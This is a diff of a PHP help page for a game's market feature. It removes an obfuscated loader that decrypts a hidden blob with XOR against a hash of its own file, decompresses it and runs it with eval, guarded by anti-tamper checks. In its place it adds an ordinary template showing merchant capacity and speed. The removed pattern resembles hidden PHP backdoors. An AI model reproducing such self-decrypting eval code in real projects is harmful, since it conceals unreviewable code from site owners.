@@ -1,24 +1,37 @@
 <?php
-$mohncwmvl="5834ebe6bec3c1c647c2b38d55e338d2";
-$kancdqj="070b02500401015452575157075557535203570706025b5356515652010c050b";
-$uzylpleeoz="SumsN6otp1IgjmWuW8iWx1KjErB//ID95k8kNXea0lAe7/XWvDVsk99ebMElDXWdhIEHBl/HW2bJLtatsDT/oExwOitJdthqDAuB+cjTeKf642EUEloEoUWqH0tlffX/olY6y0WPFr3CpGQ87fo7DHQxMBTEq6e+qY6Jphu2VLM9oPlJUuEDwBo0CoVsCe0zRET9ue3swAdN+HcP+ew8vNOuemzBcj2/Z+8YeySTVY0oQtd5VR+PTMU0VBrmiAWsXygOIuCuowijOCgpGbQoKCB69uuXqCqS3QJdM1zE8SC3q+4Qs0SQiNX6Fr3TBru74DwEHEib4BL0qXJqswbeW6eV184OBVD63OYWejXq9jfZhEYBGM17yXYLCryUqSeXOso2ugGMQ4sC8dzbDS5lpSQst0MV/+Je/hFqeV3XmsnD7oXMVFE6oCUCAmeXsgWhb/jPyPXzs0TjoSOb0ZusGUd4cIcbn20babHpuDuXTF/vAs5DvYaIAfmniXbG+8/VlcfT4R1i6L4D3g==";
-$zrvwsdhpn=file_get_contents(__FILE__);
-$fxnladntn=str_replace($uzylpleeoz,"",$zrvwsdhpn);
-if(strpos($fxnladntn,"ec"."ho")!==false||strpos($fxnladntn,"pr"."int")!==false||strpos($fxnladntn,"var_"."dump")!==false||strpos($fxnladntn,"file_put_"."contents")!==false||strpos($fxnladntn,"fw"."rite")!==false){die();}
-$crrlverx=str_replace(array($mohncwmvl,$kancdqj),array("SP_1fc7be8b","KP_410feb62"),$zrvwsdhpn);
-$rqfegeja=md5($crrlverx);
-$pbtlhkgkj=hex2bin($kancdqj);
-$mjbdrcxeo="";
-$tdzqumjmfcv=strlen($rqfegeja);
-for($hyjjfekzn=0;$hyjjfekzn<$tdzqumjmfcv;$hyjjfekzn++){
-$mjbdrcxeo.=chr(ord($pbtlhkgkj[$hyjjfekzn])^ord($rqfegeja[$hyjjfekzn]));
-}
-$wjgsikh=base64_decode($uzylpleeoz);
-$apapxach=strlen($wjgsikh);
-$nnumjom="";
-$pzghaymw=strlen($mjbdrcxeo);
-for($hyjjfekzn=0;$hyjjfekzn<$apapxach;$hyjjfekzn++){
-$nnumjom.=$wjgsikh[$hyjjfekzn]^$mjbdrcxeo[$hyjjfekzn%$pzghaymw];
-}
-$gfluhsuvzo="gzun"."compress";
-eval('?>' . $gfluhsuvzo($nnumjom) . '<?php ');
+// Market Help View
+global $config;
+?>
+<h1><?= __('help.market.title') ?></h1>
+<p><?= __('help.market.intro') ?></p>
+
+<h3><?= __('help.market.basic_info') ?></h3>
+<table class="vis" width="100%">
+    <tr>
+        <td width="200"><?= __('help.market.capacity_per_merchant') ?>:</td>
+        <td><?= __('help.market.resources_1000') ?></td>
+    </tr>
+    <tr>
+        <td><?= __('help.market.merchant_speed') ?>:</td>
+        <td><?= $config['dealer_time'] ?> <?= __('help.market.minutes_per_field') ?></td>
+    </tr>
+</table>
+
+<h3><?= __('help.market.merchants_per_level') ?></h3>
+<p><?= __('help.market.merchants_desc') ?></p>
+
+<table class="vis" width="100%">
+    <tr>
+        <th><?= __('help.market.market_level') ?></th>
+        <th><?= __('help.market.merchants') ?></th>
+    </tr>
+    <?php
+    if (isset($config['arr_dealers'])) {
+        foreach ($config['arr_dealers'] as $level => $dealers) {
+            if ($level == 0)
+                continue;
+            echo "<tr><td>$level</td><td>$dealers</td></tr>";
+        }
+    }
+    ?>
+</table>
